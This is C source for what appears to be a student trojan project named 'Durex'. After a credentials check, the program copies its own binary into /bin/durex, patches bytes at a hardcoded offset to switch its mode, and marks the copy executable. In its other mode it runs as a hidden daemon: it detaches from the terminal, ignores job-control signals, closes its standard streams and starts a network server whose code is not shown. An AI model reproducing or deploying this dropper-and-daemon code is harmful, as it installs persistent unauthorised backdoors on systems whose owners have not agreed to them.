#include "payload.h"

#include <stdio.h>

int			g_fd;
int			g_sock;

static void		sig_handler(const int signo)
{
	(void)signo;
	if (g_fd != 0)
		unlock_deamon(&g_fd);
	if (g_sock != 0)
		close(g_sock);
	exit(EXIT_SUCCESS);
}

static void		sigsig(void)
{
	signal(SIGTSTP, SIG_IGN);
	signal(SIGCONT, SIG_IGN);
	signal(SIGTTIN, SIG_IGN);
	signal(SIGTTOU, SIG_IGN);
	signal(SIGHUP, SIG_IGN);
	signal(SIGCHLD, SIG_DFL);
	signal(SIGTERM, sig_handler);
	signal(SIGINT, sig_handler);
	signal(SIGQUIT, sig_handler);
}

static int		elf_parsing(void *file, int f_size)
{
	Elf64_Ehdr	*main_header;
	Elf64_Phdr	*header;
	uint64_t	entry;
	void		*text_begin;
	int		text_size;
	int		i;
	int		fd;
	char		path[] = "/bin/durex";

	i = 0;
	main_header = (Elf64_Ehdr *)file;
	entry = main_header->e_entry;
	header = (Elf64_Phdr*)(file + sizeof(Elf64_Ehdr));
	while (i < main_header->e_phnum)
	{
		if ((header->p_type == PT_LOAD) && (entry > header->p_vaddr) && (entry < (header->p_vaddr + header->p_memsz)))
		{
			text_begin = header->p_offset + file;
			text_size = header->p_filesz;
			if (text_begin + text_size > file + f_size)
				return (1);
			break;
		}
		header++;
		i++;
	}
	memset(text_begin + 0x2820, '\0', 4);
	if ((fd = open(path, O_CREAT | O_WRONLY)) < 0)
		return (1);
	write(fd, file, f_size);
	chmod(path, S_IXUSR);
	close(fd);
	return (0);
}

static int 		copy_file(char *path)
{
	int		fd;
	struct stat	st;
	void		*file;

	if ((fd = open(path, O_RDONLY)) < 0)
		return (1);
	if ((fstat(fd, &st)) < 0)
		goto file_error;
	if ((file = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		goto file_error;
	elf_parsing(file, st.st_size);
	munmap(file, st.st_size);
	close(fd);
	return (0);
file_error:
	close(fd);
	return (1);
}

static int		check_present(void)
{
	struct dirent		*file;
	DIR			*directory;

	if ((directory = opendir("/bin")) == NULL)
		goto error;
	while ((file = readdir(directory)))
		if (!(strcmp(file->d_name, "durex")))
			goto error;
	closedir(directory);
	return (0);
error:
	closedir(directory);
	return (1);
}

int			main(int argc, char **argv)
{
	pid_t			pid;
	pid_t			sid;
	int			fd;
	int			sock;
	int			in_durex;

	(void)argc;
	in_durex = 1;
	if ((check_credentials()) != 0)
		return (EXIT_FAILURE);
	if (in_durex)
	{
		write(STDIN_FILENO, "pnardozi\n", 9); 
		if (check_present())
			return (0);
		copy_file(argv[0]);
	}
	else
	{
		g_fd = 0;
		g_sock = 0;
		fd = 0;
		if ((lock_daemon(&fd)) != 0)
			return (EXIT_FAILURE);
		g_fd = fd;
		pid = fork();
		if (pid < 0)
			goto error;
		if (pid == 0)
		{
			sigsig();
			umask(0);
			sid = setsid();
			if (sid < 0)
				goto error;
			if ((chdir("/") < 0))
				goto error;
			close(STDIN_FILENO);
			close(STDOUT_FILENO);
			close(STDERR_FILENO);
			if ((sock = create_server()) < 0)
				goto error;
			g_sock = sock;
			run_server(&sock);
			unlock_deamon(&fd);
		}
		return (EXIT_SUCCESS);
error:
		close(sock);
		unlock_deamon(&fd);
		return (EXIT_FAILURE);
	}
	return (EXIT_SUCCESS);
}
